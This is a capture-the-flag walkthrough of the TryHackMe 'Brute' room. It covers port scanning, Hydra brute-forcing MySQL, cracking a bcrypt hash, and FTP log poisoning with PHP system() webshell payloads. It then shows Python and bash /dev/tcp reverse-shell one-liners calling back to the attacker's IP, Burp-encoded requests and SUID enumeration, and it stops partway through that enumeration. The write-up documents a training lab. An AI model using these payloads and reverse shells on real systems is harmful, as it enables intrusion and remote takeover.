---
You as well, Brutus?
---

# Brute — Writeup

## Overview
### Brute — Writeup
### Brute — Writeup
![](https://i.postimg.cc/5NFMNX0n/Webp-net-resizeimage-1.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/8dedd4f34a2aff294744a0572773eb5d.png)

## Privilege Escalation
Start Machine
You won't be able to just brute your way into this one, or will you?
Answer the questions below
```text
┌──(kali㉿kali)-[~/nappy]
└─$ rustscan -a 10.10.217.25 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.217.25:22
Open 10.10.217.25:21
Open 10.10.217.25:80
Open 10.10.217.25:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 16:34 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:34
Completed Parallel DNS resolution of 1 host. at 16:34, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:34
Scanning 10.10.217.25 [4 ports]
Discovered open port 22/tcp on 10.10.217.25
Discovered open port 21/tcp on 10.10.217.25
Discovered open port 3306/tcp on 10.10.217.25
Discovered open port 80/tcp on 10.10.217.25
Completed Connect Scan at 16:34, 0.20s elapsed (4 total ports)
Initiating Service scan at 16:34
Scanning 4 services on 10.10.217.25
Completed Service scan at 16:34, 6.56s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.217.25.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 6.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 4.73s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Nmap scan report for 10.10.217.25
Host is up, received user-set (0.20s latency).
Scanned at 2023-01-12 16:34:09 EST for 17s

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c7721464243c1101e950730fa48c33d6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXqzNUndANboqhGwqmfhneakMW3jjexZbHnw2pVw+ljoqMzxp2+CT06bhnRxtBRMeKXzX4E4cDOOKx1gHrkoVZgOjoz8X2GxfxH+KxGcmQPxODfgPpH18vxFvYaZpRAImr2jCa7TgfIyOZjtFb2rQDjAfvO+RK6egqMCqU+YuGdEeEvMBsNIiGymZl2pWzvk1Xenh7bMHl9YOiT41AhyFfvAQ4nfFLjk068S3OQKZ6d2jmFDr5YYd5Q9pLcoPGU9+yUCbBzrFCMdaRyvbYcbJnM8K65wKDhnrD5wAU6fAWyxRT6PaPFBhJp+fqMXZJAQUEWZHjAVOhHd+ZHgU6nXJ+u9GfXXj5ceZ7JJGclZzVKb7JHX93U1Ofuq+N+Zl3cdoc9Vi56N6ZamxaTTALZRM3UmrjqWfbDtyKZcnqQekb/40Pb4VzCzpvkGBW5++LXiMzQ/Ri7wcyfS0leBDMV0WdHR6DRiAVlii3M9YASX498tENGCBhe7yzGNFmPM3+rCM=
|   256 0e0e07a53c3209ed921b6884f12fcce1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLe3OgttRgIkQikz1ER+UuSSBb80MH3A+1Vmd+VNBKZhl9EqUBT4K+YpIA7NJdau/V1NzhuZdvVAUWd03rb43wk=
|   256 32f1d2ececc1ba2218ec02f4bc74c7af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGj5zUvI22cV4JdUIj3IFx/3PVHqujyIkwU9MjP3gpay
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
3306/tcp open  mysql   syn-ack MySQL 8.0.28-0ubuntu0.20.04.3
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|   Thread ID: 18
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, IgnoreSigpipes, InteractiveClient, ODBCClient, ConnectWithDatabase, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: T0~\x1Dt\x1B#1WZL\x1F\x0E 'S\x02\x16"i
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.26_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-19T04:00:09
| Not valid after:  2031-10-17T04:00:09
| MD5:   5441cf59375b5402352d4df1dab3f945
| SHA-1: de74633f3958dd200a40e5b4ffa9cae862d89d46
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfOC4wLjI2X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIxMTAxOTA0MDAwOVoXDTMxMTAxNzA0MDAwOVowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzguMC4yNl9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDceHCeokIvf/5tiDXOhmUK
| HjWxbf+vHbhSEV0kg9J5CNyqL9JRLL+vLStv5KXyw4giERZmQZR7UM3VLu/jw1vg
| K3CMB7CWqaCTJclhqHgJXlH2OU0LGlkgjvoUjV2pnQKGsCEDVl2Q4QiXKzSMai4d
| ISz1QR9kQsV8bOEw7a46Ece9hPH4ESSUF7ZuTgnbLzBhxYlVa5HYQ2Zt7Z2c6ZGR
| fyJTMtovZzmxN0KWaiOJzCBAT5/ZaTiVR2mK0KpzoxJ1sut5Trw98Uh2iBtC/rXt
| z6+HiJjncW1phZNaXWgYrkp5GrGz39LPmK+XmBNlraokiLDubJkKrgvE8vILE9rd
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAKcxAdpb
| Z6ahf4CWhSPH4maAHWqYytghjPjG1Tlk6Lvwu3wTJUqItsmphvRIXvu1fME4TRZd
| ZG9ZM8BARM5ZZYCRHmhfGA5JBaKpAvfjhPNVssvVjSVI4cpiMTVrPikva22Qzxq7
| 33oVAFsfYlSiFqlRHqdNwAv5TSn0N85xU/En6DmUowaQzwTcPBrns1EC1lrDMBXU
| WY2rYfQiC0EkZVhkQuNGkXyUj/e89mwp8RVVJFkmjZ6NbuGCDCenG+A6/kDWj9ps
| mnDukjklQJKq9p6iIhrV69ejm3OHL5hfPRahBIM8AYAtljW2LQ67elYijyCde58Z
| AcodcjpmQ8egD1w=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ ftp 10.10.217.25
Connected to 10.10.217.25.
220 (vsFTPd 3.0.3)
Name (10.10.217.25:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> exit
221 Goodbye.

https://dev.mysql.com/doc/refman/8.0/en/default-privileges.html
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ nmap --script mysql-enum -sV -p 3306 -Pn 10.10.217.25 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 17:07 EST
Nmap scan report for 10.10.217.25
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 2 seconds, average tps: 5.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ mysql -h 10.10.183.215 -u root -p   
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'ip-10-8-19-103.eu-west-1.compute.internal' (using password: YES)
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.183.215 mysql -V -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-13 11:09:37
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://10.10.183.215:3306/
[ATTEMPT] target 10.10.183.215 - login "root" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "iloveyou" - 5 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "princess" - 6 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "1234567" - 7 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "rockyou" - 8 of 14344399 [child 2] (0/0)
[3306][mysql] host: 10.10.183.215   login: root   password: rockyou
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-13 11:09:57
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ mysql -h 10.10.183.215 -u root -p           
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 39
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| website            |
+--------------------+
5 rows in set (0.195 sec)

MySQL [(none)]> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [website]> show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.194 sec)

MySQL [website]> describe users;
+------------+--------------+------+-----+-------------------+-------------------+
| Field      | Type         | Null | Key | Default           | Extra             |
+------------+--------------+------+-----+-------------------+-------------------+
| id         | int          | NO   | PRI | NULL              | auto_increment    |
| username   | varchar(50)  | NO   | UNI | NULL              |                   |
| password   | varchar(255) | NO   |     | NULL              |                   |
| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED |
+------------+--------------+------+-----+-------------------+-------------------+
4 rows in set (0.498 sec)

MySQL [website]> select usernme, password from users;
ERROR 1054 (42S22): Unknown column 'usernme' in 'field list'
MySQL [website]> select username, password from users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we |
+----------+--------------------------------------------------------------+
1 row in set (0.326 sec)

or

MySQL [website]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.412 sec)

https://hashcat.net/wiki/doku.php?id=example_hashes ($2*$ bcrypt --> 3200)
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ cat hash_brute            
$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ hashcat -m 3200 -a 0 hash_brute /usr/share/wordlists/rockyou.txt -o hash_brute_cracked
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSY...SKn4we
Time.Started.....: Fri Jan 13 11:18:41 2023 (4 secs)
Time.Estimated...: Fri Jan 13 11:18:45 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        9 H/s (5.53ms) @ Accel:4 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32/14344385 (0.00%)
Rejected.........: 0/32 (0.00%)
Restore.Point....: 16/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 654321 -> butterfly
Hardware.Mon.#1..: Util: 72%

Started: Fri Jan 13 11:16:09 2023
Stopped: Fri Jan 13 11:18:49 2023
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ hashcat -m 3200 -a 0 hash_brute --show                                                
$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ cat hash_brute_cracked 
$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger

or using john
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_brute
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tigger           (?)     
1g 0:00:00:00 DONE (2023-01-13 11:20) 1.041g/s 37.50p/s 37.50c/s 37.50C/s 123456..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

Adrian:tigger

login

view-source:http://10.10.183.215/welcome.php

<h1 class="my-5">Welcome back Adrian, Your log file is ready for viewing.</h1>
        <br> 
    <form action="" method="post">
        <input type="submit" name="log" value="Log">	
    </form>
    <br>
    <p> 
        <a href="logout.php" class="btn btn-danger ml-3">Sign Out of Your Account</a>
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ ftp 10.10.183.215
Connected to 10.10.183.215.
220 (vsFTPd 3.0.3)
Name (10.10.183.215:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed

Fri Jan 13 16:22:28 2023 [pid 1617] CONNECT: Client "::ffff:10.8.19.103" Fri Jan 13 16:22:38 2023 [pid 1616] [anonymous] FAIL LOGIN: Client "::ffff:10.8.19.103"
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ nc -vn 10.10.183.215 21
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.183.215:21.
220 (vsFTPd 3.0.3)
whoami
530 Please login with USER and PASS.

Ftp log poisoning
https://secnhack.in/ftp-log-poisoning-through-lfi/

payloads : 

'<?php system($_GET['x']); ?>'
'<?php system($_REQUEST['x']); ?>'
'<?php echo system($_REQUEST['x']); ?>'
'<?php echo shell_exec($_GET['x']); ?>'

Estas son líneas de código PHP que permiten ejecutar comandos en el sistema operativo del servidor donde se ejecuta el código. La diferencia entre ellas es la forma en que se recibe la entrada del usuario.

-   En la primera línea, el comando se recibe a través de la variable $_GET['x'].
-   En la segunda línea, el comando se recibe a través de la variable $_REQUEST['x'].
-   En la tercera línea, el comando se recibe a través de la variable $_REQUEST['x'] y su salida se muestra en la página web.
-   En la cuarta línea, el comando se recibe a través de la variable $_GET['x'] y su salida se muestra en la página web usando la función shell_exec().

Sin embargo, estas líneas de código son altamente peligrosas ya que permiten a un atacante ejecutar cualquier comando en el sistema operativo del servidor, incluyendo comandos maliciosos. Es importante asegurarse de validar y sanitizar cualquier entrada del usuario antes de utilizarlo en una función como system() o shell_exec().
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ ftp 10.10.183.215
Connected to 10.10.183.215.
220 (vsFTPd 3.0.3)
Name (10.10.183.215:kali): '<?php system($_GET['x']); ?>'
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.

http://10.10.183.215/welcome.php?x=id

Fri Jan 13 16:47:24 2023 [pid 2662] ['uid=33(www-data) gid=33(www-data) groups=33(www-data)
'] FAIL LOGIN: Client "::ffff:10.8.19.103"

revshell

https://www.revshells.com/

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ rlwrap nc -lnvp 4443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 10.10.183.215.
Ncat: Connection from 10.10.183.215:51494.
www-data@brute:/var/www/html$ exit
exit
exit

or

bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'

bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E8%2E19%2E103%2F4444%200%3E%261%27
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.183.215.
Ncat: Connection from 10.10.183.215:37024.
bash: cannot set terminal process group (766): Inappropriate ioctl for device
bash: no job control in this shell
www-data@brute:/var/www/html$ 

or using burp
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ ftp 10.10.183.215
Connected to 10.10.183.215.
220 (vsFTPd 3.0.3)
Name (10.10.183.215:kali): '<?php echo system($_REQUEST['x']); ?>'
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.

using request with burp

---
POST /welcome.php HTTP/1.1
Host: 10.10.183.215
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://10.10.183.215
Connection: close
Referer: http://10.10.183.215/welcome.php
Cookie: PHPSESSID=627ddsmmq6t3vkk494opc7qc56
Upgrade-Insecure-Requests: 1
log=Log&x=whoami
---
Fri Jan 13 17:31:51 2023 [pid 6549] CONNECT: Client "::ffff:10.8.19.103"
Fri Jan 13 17:31:56 2023 [pid 6548] ['www-data
www-data'] FAIL LOGIN: Client "::ffff:10.8.19.103"

to encode just press CTRL + U

bash+-c+'bash+-i+>%26+/dev/tcp/10.8.19.103/4444+0>%261'

log=Log&x=bash+-c+'bash+-i+>%26+/dev/tcp/10.8.19.103/4444+0>%261'

and then send
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.183.215.
Ncat: Connection from 10.10.183.215:37028.
bash: cannot set terminal process group (766): Inappropriate ioctl for device
bash: no job control in this shell
www-data@brute:/var/www/html$ whoami
whoami
www-data

stabilizing shell

www-data@brute:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@brute:/var/www/html$ 
zsh: suspended  rlwrap nc -lnvp 4444
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ stty raw -echo; fg      
[1]  + continued  rlwrap nc -lnvp 4444
www-data@brute:/var/www/html$ export TERM=xterm-256color
TERM=xterm-256color

Este es un comando de terminal utilizado para cambiar la configuración de la terminal.

-   "stty raw" desactiva la interpretación de caracteres especiales por la terminal, lo que permite ingresar caracteres como Ctrl o Alt sin que la terminal los interprete como comandos.
-   "-echo" desactiva el eco de los caracteres ingresados, lo que significa que los caracteres no se imprimen en pantalla mientras se ingresan.

"fg" es un comando utilizado para traer un trabajo en segundo plano al primer plano.

Este es un comando de la línea de comandos que se utiliza para establecer una variable de entorno llamada TERM. Esta variable es utilizada por el sistema operativo para determinar qué tipo de terminal está siendo utilizado.

El valor especificado en el comando ("xterm") indica que se está utilizando una terminal xterm. Esta es una de las terminales más comunes en sistemas Unix y Linux, y es compatible con una amplia variedad de características y funciones.

Existen varios tipos de terminales (vt100, xterm, ansi, etc) y cada uno tiene su propia configuración y características. Al establecer TERM = xterm, se está diciendo al sistema operativo que se está utilizando una terminal xterm, lo que permite al sistema operativo utilizar las características y configuraciones específicas de xterm.

This command is similar to the previous one. It sets the TERM environment variable to "xterm-256color", indicating that the terminal being used is an xterm terminal with support for 256 colors.

256 color terminal allows the terminal to display more colors than the traditional 8-color terminal, thus providing more visual options and better color representation. This feature is useful in applications such as text editors and terminal-based games that require advanced color support.

It's also important to note that some applications may require the TERM variable to be set to a specific value in order to function properly. Setting the TERM variable to the correct value ensures that these applications will work as expected.

www-data@brute:/var/www/html$ ls
ls
config.php  index.php  logout.php  welcome.php
www-data@brute:/var/www/html$ cat config.php
cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'P@sswr0d789!');
define('DB_NAME', 'website');
 
/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($mysqli === false){
    die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>

www-data@brute:/var/www/html$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             43K Sep 16  2020 /snap/core18/2253/bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/2253/bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2253/bin/su
-rwsr-xr-x 1 root   root             27K Sep 16  2020 /snap/core18/2253/bin/umount
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2253/usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2253/usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2253/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /snap/core18/2253/usr/bin/newgrp
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /snap/core18/2253/usr/bin/passwd
-rwsr-xr-x 1 root   root            146K Jan 19  2021 /snap/core18/2253/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/2253/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            427K Aug 11  2021 /snap/core18/2253/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             43K Sep 16  2020 /snap/core18/2344/bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/2344/bin/ping
-rwsr-xr-x 1 root   root             44K Jan 25  2022 /snap/core18/2344/bin/su
-rwsr-xr-x 1 root   root             27K Sep 16  2020 /snap/core18/2344/bin/umount
-rwsr-xr-x 1 root   root             75K Jan 25  2022 /snap/core18/2344/usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Jan 25  2022 /snap/core18/2344/usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Jan 25  2022 /snap/core18/2344/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Jan 25  2022 /snap/core18/2344/usr/bin/newgrp
-rwsr-xr-x 1 root   root             59K Jan 25  2022 /snap/core18/2344/usr/bin/passwd
-rwsr-xr-x 1 root   root            146K Jan 19  2021 /snap/core18/2344/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/2344/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            427K Mar  3  2020 /snap/core18/2344/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             84K Jul 14  2021 /snap/core20/1242/usr/bin/chfn
-rwsr-xr-x 1 root   root             52K Jul 14  2021 /snap/core20/1242/usr/bin/chsh
-rwsr-xr-x 1 root   root             87K Jul 14  2021 /snap/core20/1242/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             55K Jul 21  2020 /snap/core20/1242/usr/bin/mount
-rwsr-xr-x 1 root   root             44K Jul 14  2021 /snap/core20/1242/usr/bin/newgrp
-rwsr-xr-x 1 root   root             67K Jul 14  2021 /snap/core20/1242/usr/bin/passwd
-rwsr-xr-x 1 root   root             67K Jul 21  2020 /snap/core20/1242/usr/bin/su
-rwsr-xr-x 1 root   root            163K Jan 19  2021 /snap/core20/1242/usr/bin/sudo
